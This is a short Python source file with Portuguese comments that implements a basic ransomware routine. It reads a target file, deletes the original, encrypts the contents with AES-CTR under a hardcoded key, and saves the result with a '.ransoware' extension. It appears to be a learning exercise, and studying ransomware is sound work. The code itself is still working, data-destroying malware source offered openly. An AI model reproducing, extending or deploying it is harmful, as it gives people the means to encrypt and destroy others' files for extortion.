import os
import pyaes

#Abrindo o arquivo para ser criptografado
def encrypt(file_txt='teste.xt'):
    

    file_name = file_txt
    file = open(file_name,'rb')
    file_data =file.read()
    file.close()


    os.remove(file_name)

    #chave para descriptografar
    key = b'testeransomwares'
    aes = pyaes.AESModeOfOperationCTR(key)

    #criptograr arquivo
    crypto_data = aes.encrypt(file_data)


    #salvar Arquivo criptografado
    new_file = file_name + '.ransoware'
    new_file =  open(f'{new_file}','wb')
    new_file.write(crypto_data)
    new_file.close()


